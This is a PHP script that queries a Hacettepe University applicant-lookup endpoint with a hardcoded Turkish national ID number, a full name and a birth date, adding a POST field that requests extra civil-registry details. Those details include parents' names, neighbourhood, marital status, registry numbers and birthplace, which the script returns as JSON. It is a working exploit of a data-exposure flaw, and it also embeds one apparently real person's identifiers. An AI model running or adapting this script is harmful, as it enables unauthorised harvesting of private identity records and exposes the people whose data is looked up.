<?php
header("Content-Type: application/json; utf-8;");
$tc= "10244066328";
$d_tarih = "29.03.2002";
$url = "https://enstitu.hacettepe.edu.tr/aday/crud!bilgiGetir.action?yerli_kimlik_tc_kimlik_no=$tc&aday_ad=FURKAN ZİNNURİ&aday_soyad=IŞIK&yerli_kimlik_dogum_tarih=$d_tarih";
//$proxyauth = 'user:password';
$agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "ayricalik=ad,soyad,baba_adi,ana_adi,mahalle,medeni_hal,cinsiyet,dogum_tarih,cilt_no,aile_sira_no,sira_no,dogum_yer,il_pk,il_ad,ilce_pk,ilce_ad");
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
$curl_scraped_page = curl_exec($ch);
curl_close($ch);
echo $curl_scraped_page;
$error = '{"adayList":[],"total":0,"aday_pk":1,"success":true}';
$error1 = '{"success":"hata"}';
$json = json_decode($curl_scraped_page, true);
if($json['success'] != 1 or $curl_scraped_page == $error)
{
    echo (json_encode(["success" => "false","error" => "invalid"]));
}
else{
$bilgiler = Capture($curl_scraped_page, '{"adayList":[','],"total":0,"aday_pk":1,"success":true}');
$bilgi = json_decode($bilgiler, true);
switch($bilgi['medeni_hal'])
{
case '1':
$medeni='Bekar';
break;
case '2':
$medeni='Evli';
break;
case '3':
$medeni='Boşanmış';
break;
case '4':
$medeni='Ölü';
break;
}
switch($bilgi['cinsiyet'])
{
case '1':
$cinsiyet='Erkek';
break;
case '0':
$cinsiyet='Kız';
break;
}
$ad = $bilgi['ad'];
$soyad = $bilgi['soyad'];
$baba_adi = $bilgi['baba_adi'];
$ana_adi = $bilgi['ana_adi'];
$mahalle = $bilgi['mahalle'];
$medeni = $medeni;
$cinsiyet = $cinsiyet;
$dogum_tarih = $bilgi['dogum_tarih'];
$cilt_no = $bilgi['cilt_no'];
$aile_sira_no = $bilgi['aile_sira_no'];
$sira_no = $bilgi['sira_no'];
$dogum_yer = $bilgi['dogum_yer'];
$il_ad = $bilgi['il_ad'];
$ilce_ad = $bilgi['ilce_ad'];
echo (json_encode(["success" => "true", "ad" => "$ad", "soyad" => "$soyad", "baba_adi" => "$baba_adi", "ana_adi" => "$ana_adi", "mahalle" => "$mahalle", "medeni" => "$medeni", "cinsiyet" => "$cinsiyet", "dogum_tarih" => "$dogum_tarih", "cilt_no" => "$cilt_no", "aile_sira_no" => "$aile_sira_no", "sira_no" => "$sira_no", "dogum_yer" => "$dogum_yer", "il_ad" => "$il_ad", "ilce_ad" => "$ilce_ad"]));
}

?>